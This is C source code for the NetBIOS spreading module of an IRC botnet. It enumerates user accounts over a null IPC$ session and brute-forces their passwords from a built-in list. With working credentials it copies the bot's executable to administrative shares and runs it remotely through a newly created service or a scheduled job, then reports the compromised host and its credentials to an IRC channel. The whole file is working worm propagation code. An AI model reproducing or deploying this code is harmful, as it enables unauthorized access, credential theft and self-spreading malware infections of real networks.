#include "includes.h"
#include "functions.h"
#include "passwd.h"
#ifndef NO_NETBIOS

#ifndef NO_SERVICE
BOOL StartViaCreateService(const char *share, const char *host, const char *user, const char *password, const char *fname)
{
	bool bRetVal=FALSE;
	char rndSvcName[256];
	SC_HANDLE hServiceControl=fOpenSCManager(host,SERVICES_ACTIVE_DATABASE,SC_MANAGER_ALL_ACCESS);
	if (!hServiceControl)
		return FALSE;

	char szBotRemote[MAX_PATH];
	sprintf(szBotRemote, "%s\\%s\\%s", host, share, fname);
	sprintf(rndSvcName,"%d%d%d%d%d",rand()%9,rand()%9,rand()%9,rand()%9,rand()%9);
	
	SC_HANDLE hService=fCreateService(hServiceControl, rndSvcName,
									 rndSvcName, SERVICE_ALL_ACCESS, \
									 SERVICE_WIN32_SHARE_PROCESS, SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL, \
									 szBotRemote, NULL, NULL, NULL, NULL, NULL);
	if(!hService)
	{
		fCloseServiceHandle(hServiceControl);
		return FALSE;
	}

	if (fStartService(hService, 0, NULL))
	{
		Sleep(5000);
		fDeleteService(hService);
		fCloseServiceHandle(hServiceControl);
		fCloseServiceHandle(hService);
		return TRUE;
	}
	else
	{
		if (GetLastError()==1053)
		{
			SC_HANDLE nhService=fOpenService(hServiceControl, servicename, SERVICE_ALL_ACCESS);
			if(nhService)
			{
				if (fStartService(nhService, 0, NULL))
				{
					fDeleteService(hService);
					fCloseServiceHandle(hServiceControl);
					fCloseServiceHandle(hService); 
					fCloseServiceHandle(nhService);
					return TRUE;
				}
			}
		}
		fDeleteService(hService);
		fCloseServiceHandle(hServiceControl);
		fCloseServiceHandle(hService);
		return FALSE;
	}
}
#endif

BOOL StartViaNetScheduleJobAdd(char *szServer,char *fname)
{
	WCHAR wszNetbios[200];
	TIME_OF_DAY_INFO *tinfo=NULL;
	MultiByteToWideChar(CP_ACP,0,szServer,-1,wszNetbios,sizeof(wszNetbios));
	NET_API_STATUS nStatus=fNetRemoteTOD(wszNetbios,(LPBYTE *)&tinfo);
	if (nStatus == NERR_Success) {
		if (tinfo) {
			DWORD JobID;
			AT_INFO at_time;
			NET_API_STATUS nStatus;
			WCHAR wszFilename[MAX_PATH];

			DWORD jobtime=tinfo->tod_elapsedt / 60;
			jobtime-=tinfo->tod_timezone;
			jobtime+=2;
			jobtime%=(24*60);
			ZeroMemory(&at_time,sizeof(AT_INFO));
			at_time.JobTime=jobtime*60000;
			MultiByteToWideChar(CP_ACP,0,fname,-1,wszFilename,sizeof(wszFilename));
			at_time.Command=wszFilename; 

			if ((nStatus=fNetScheduleJobAdd(wszNetbios,(BYTE *)&at_time,&JobID)) == NERR_Success)
			{
				fNetApiBufferFree(tinfo);
				return TRUE;
			}
		}
	}
	fNetApiBufferFree(tinfo);
	return FALSE;
}

BOOL NetConnect(char *szUsername, char *szPassword, char *szServer, char *target, void* conn, EXINFO exinfo)
{
#ifndef NO_SERVICE
	ImpersonateInteractiveUser();
#endif
	IRC* irc=(IRC*)conn;
	NETRESOURCE nr;
	ZeroMemory(&nr,sizeof(NETRESOURCE));
	nr.lpRemoteName=szServer;
	nr.dwType=RESOURCETYPE_DISK;
	nr.lpLocalName=NULL;
	nr.lpProvider=NULL;

	// Call the WNetAddConnection2 function to make the connection,
	//   specifying a persistent connection.
	DWORD dwResult = fWNetAddConnection2(&nr, (LPSTR)szPassword, (LPSTR)szUsername, 0);
	if(dwResult != NO_ERROR) {
		Sleep(10);
		fWNetCancelConnection2(szServer,CONNECT_UPDATE_PROFILE,TRUE);
		return FALSE; 
	}
	
	//if (!exinfo.silent && exinfo.verbose)
	//	irc->privmsg(target,"%s %s: Connected: %s \"%s\" /user:%s", scan_title, exploit[exinfo.exploit].name,szServer,szPassword,szUsername);

	char szRemoteFile[MAX_PATH];
	char *sharepath[]={"Admin$","Admin$\\system32",
						"c$\\winnt\\system32","c$\\windows\\system32",
						"d$\\winnt\\system32","d$\\windows\\system32"};
						//"c","d"

	char curfile[MAX_PATH];
	char fname[_MAX_FNAME];
	sprintf(fname,"eraseme_%d%d%d%d%d.exe",rand()%9,rand()%9,rand()%9,rand()%9,rand()%9);
	GetModuleFileName(GetModuleHandle(NULL),curfile,sizeof(curfile));

	
	
	/*SHARE_INFO_0 BufPtr,p;
	NET_API_STATUS res;
	DWORD er=0,tr=0,resume=0, w;

	do // begin do
	{
		res=NetShareEnum(szServer,0,(LPBYTE *)&BufPtr,-1,&er,&tr,&resume);
		if(res == ERROR_SUCCESS || res == ERROR_MORE_DATA)
		{
			p=BufPtr;
			for(w=1;w<=er;w++)
			{
				//p->shi0_netname
				//printf("%-20S%-30S%-8u",p->shi502_netname, p->shi502_path, p->shi502_current_uses);
				//p++;
			}
			NetApiBufferFree(BufPtr);
		}
		else 
		printf("Error: %ld\n",res);
	}
	while (res==ERROR_MORE_DATA); // end do*/
	


	int j=0;
	int i;
	for (i=0;i<(sizeof(sharepath) / sizeof(LPTSTR));i++) {
		sprintf(szRemoteFile,"%s\\%s\\%s",szServer,sharepath[i],fname);
		if (GetFileAttributes(szRemoteFile) != INVALID_FILE_ATTRIBUTES)
			SetFileAttributes(szRemoteFile,FILE_ATTRIBUTE_NORMAL);
		if ((j=CopyFile(curfile,szRemoteFile,FALSE)) != 0)
		{
		//	if (!exinfo.silent && exinfo.verbose)
		//		irc->privmsg(target,"%s %s: Copied File: %s\\%s, %s/%s, %s to %s", scan_title, exploit[exinfo.exploit].name,szServer,sharepath[i],szUsername,((strcmp(szPassword,"")==0)?("(Blank)"):(szPassword)),curfile,szRemoteFile);
			break;
		}
		else if (GetLastError() == ERROR_ACCESS_DENIED) {
			if (_access(szRemoteFile,00) == 0) {
				sprintf(fname,"eraseme_%d%d%d%d%d.exe",rand()%9,rand()%9,rand()%9,rand()%9,rand()%9);
				sprintf(szRemoteFile,"%s\\%s\\%s",szServer,sharepath[i],fname);
				if ((j=CopyFile(curfile,szRemoteFile,FALSE)) != 0)
				{
				//	if (!exinfo.silent && exinfo.verbose)
				//		irc->privmsg(target,"%s %s: Copied File: %s\\%s, %s/%s, %s to %s", scan_title, exploit[exinfo.exploit].name,szServer,sharepath[i],szUsername,((strcmp(szPassword,"")==0)?("(Blank)"):(szPassword)),curfile,szRemoteFile);
					break;
				}
			}
		}
		else
		{
			//if (GetLastError()!=53 && GetLastError()!=2)
			//{
			//	if (!exinfo.silent)
			//		irc->privmsg(target,"%s %s: Error: %s\\%s, %s/%s, CopyFile: %d, %s to %s", scan_title, exploit[exinfo.exploit].name,szServer,sharepath[i],szUsername,((strcmp(szPassword,"")==0)?("(Blank)"):(szPassword)),GetLastError(),curfile,szRemoteFile);
			//}
		}
	}
	if (!j) {
	//	if (!exinfo.silent)
	//		irc->privmsg(target,"%s %s: %s \"%s\" /user:%s, CopyFile...", scan_title, exploit[exinfo.exploit].name,szServer,szPassword,szUsername);
		fWNetCancelConnection2(szServer,CONNECT_UPDATE_PROFILE,TRUE);
		return FALSE;
	}

#ifndef NO_SERVICE
	if (StartViaCreateService(sharepath[i], szServer, szUsername, szPassword, fname))
	{
		if (!exinfo.silent)
			irc->privmsg(target,"%s %s: Exploiting IP: %s\\%s, %s/%s (CreateService)", scan_title, exploit[exinfo.exploit].name,szServer,sharepath[i],szUsername,((strcmp(szPassword,"")==0)?("(Blank)"):(szPassword)));
			
		exploit[exinfo.exploit].stats++;
		fWNetCancelConnection2(szServer,CONNECT_UPDATE_PROFILE,TRUE);
		return TRUE;
	}
#endif
	
	if (StartViaNetScheduleJobAdd(szServer,fname))
	{
		if (!exinfo.silent)
			irc->privmsg(target,"%s %s: Exploiting IP: %s\\%s, %s/%s (NetScheduleJobAdd)", scan_title, exploit[exinfo.exploit].name,szServer,sharepath[i],szUsername,((strcmp(szPassword,"")==0)?("(Blank)"):(szPassword)));

		exploit[exinfo.exploit].stats++;
		fWNetCancelConnection2(szServer,CONNECT_UPDATE_PROFILE,TRUE);
		return TRUE;
	}

	if (GetFileAttributes(szRemoteFile) != INVALID_FILE_ATTRIBUTES)
		SetFileAttributes(szRemoteFile,FILE_ATTRIBUTE_NORMAL);
	int t=0;
	if ((t=DeleteFile(szRemoteFile)) != 0)
	{
	//	if (!exinfo.silent && exinfo.verbose)
	//		irc->privmsg(target,"%s %s: Erased File: %s\\%s, %s/%s, %s", scan_title, exploit[exinfo.exploit].name,szServer,sharepath[i],szUsername,((strcmp(szPassword,"")==0)?("(Blank)"):(szPassword)),szRemoteFile);
	}
	else
	{
	//	if (!exinfo.silent && exinfo.verbose)
	//		irc->privmsg(target,"%s %s: Failed to erase file: %s\\%s, %s/%s, %s (!DeleteFile(%d))", scan_title, exploit[exinfo.exploit].name,szServer,sharepath[i],szUsername,((strcmp(szPassword,"")==0)?("(Blank)"):(szPassword)),szRemoteFile,t);
	}

	if (!exinfo.silent && exinfo.verbose)
		irc->privmsg(target,"%s %s: Failed to exploit IP: %s\\%s, %s/%s",scan_title, exploit[exinfo.exploit].name,szServer,sharepath[i],szUsername,((strcmp(szPassword,"")==0)?("(Blank)"):(szPassword)));

	fWNetCancelConnection2(szServer,CONNECT_UPDATE_PROFILE,TRUE);
	return FALSE;
}


BOOL RootBox(char *szUsername, char *szServer, char *target, void* conn, EXINFO exinfo)
{
//	IRC* irc=(IRC*)conn;
	int i=0;
//	if (!exinfo.silent && exinfo.veryverbose)
//		irc->privmsg(target,"%s %s: Trying to root: %s \"%s\"", scan_title, exploit[exinfo.exploit].name,szServer,szUsername);
	while (mypasses[i]) {
		if (NetConnect(szUsername,mypasses[i],szServer,target,conn,exinfo) == TRUE) 
			return TRUE;
		Sleep(200);
		i++;
	}
//	if (!exinfo.silent && exinfo.veryverbose)
//		irc->privmsg(target,"%s %s: Failed to root: %s \"%s\" %d", scan_title, exploit[exinfo.exploit].name,szServer,szUsername,i);
	return FALSE;
}



BOOL netbios(char *target, void* conn,EXINFO exinfo)
{
	IRC* irc=(IRC*)conn;
	char szUsername[300], RemoteName[200], szServer[18];
	WCHAR  *pszServerName = NULL,sName[500];
	LPUSER_INFO_0 pBuf=NULL, pTmpBuf;
	DWORD dwLevel=0, dwPrefMaxLen=MAX_PREFERRED_LENGTH, dwEntriesRead=0,
		dwTotalEntries=0, dwResumeHandle=0, dwTotalCount=0;
	NET_API_STATUS nStatus;

	sprintf(szServer,"\\\\%s",exinfo.ip);
	MultiByteToWideChar(CP_ACP,0,szServer,-1,sName,sizeof(sName));
	pszServerName=sName;

	NETRESOURCE nr;
	nr.lpLocalName=NULL;
	nr.lpProvider=NULL;
	nr.dwType=RESOURCETYPE_ANY;
	sprintf(RemoteName,"%s\\ipc$",szServer);
	nr.lpRemoteName=RemoteName;
	if (fWNetAddConnection2(&nr,"","",0) != NO_ERROR) {
		fWNetCancelConnection2(RemoteName,0,TRUE);
		return FALSE;
	}
	
	do {
		nStatus=fNetUserEnum(pszServerName, dwLevel, FILTER_NORMAL_ACCOUNT, (LPBYTE*)&pBuf,
			dwPrefMaxLen, &dwEntriesRead, &dwTotalEntries, &dwResumeHandle);
		fWNetCancelConnection2(RemoteName,0,TRUE);

		// If the call succeeds,
		if ((nStatus == NERR_Success) || (nStatus == ERROR_MORE_DATA))
		{
			if ((pTmpBuf = pBuf) != NULL)
			{
				for (DWORD i = 0; (i < dwEntriesRead); i++)
				{
					if (pTmpBuf == NULL) 
						break;
					WideCharToMultiByte(CP_ACP,0,pTmpBuf->usri0_name,-1,szUsername,sizeof(szUsername),NULL,NULL);

					if ((RootBox(szUsername,szServer,target,conn,exinfo))==TRUE) 
						break;

					pTmpBuf++;
					dwTotalCount++;
				}
			}
		}
		if (pBuf != NULL)
		{
			fNetApiBufferFree(pBuf);
			pBuf = NULL;
		}
	} 
	while (nStatus == ERROR_MORE_DATA);

	if (pBuf != NULL) 
		fNetApiBufferFree(pBuf);

	if (nStatus == ERROR_ACCESS_DENIED)
	{
		for (int i=0; usernames[i]; i++)
		{
			if ((RootBox(usernames[i],szServer,target,conn,exinfo))==TRUE) 
				break;
		}
	}
	
	return TRUE;
}
#endif
